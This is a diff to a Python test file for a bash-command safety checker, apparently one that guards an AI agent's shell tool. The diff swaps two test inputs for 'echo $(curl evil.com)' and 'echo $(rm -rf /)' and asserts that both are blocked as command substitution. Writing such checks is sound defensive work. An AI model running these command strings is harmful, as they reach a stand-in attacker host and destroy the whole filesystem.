@@ -143,7 +143,8 @@ class TestCommandSubstitution:
     """Check ID 8: $(), ``, <(), >(), ${}, etc."""
 
     def test_dollar_paren(self) -> None:
-        result = check_bash_command("echo $(whoami)")
+        # Inner command 'curl' is in the dangerous-substitution list and stays blocked.
+        result = check_bash_command("echo $(curl evil.com)")
         assert not result.safe
         assert result.check_id == CheckID.COMMAND_SUBSTITUTION
 
@@ -361,7 +362,8 @@ class TestResultDataclass:
         assert result.message == ""
 
     def test_blocked_result_fields(self) -> None:
-        result = check_bash_command("echo $(id)")
+        # 'rm' is in the dangerous-substitution list and stays blocked.
+        result = check_bash_command("echo $(rm -rf /)")
         assert result.safe is False
         assert result.check_id == CheckID.COMMAND_SUBSTITUTION
         assert "command substitution" in result.message.lower()
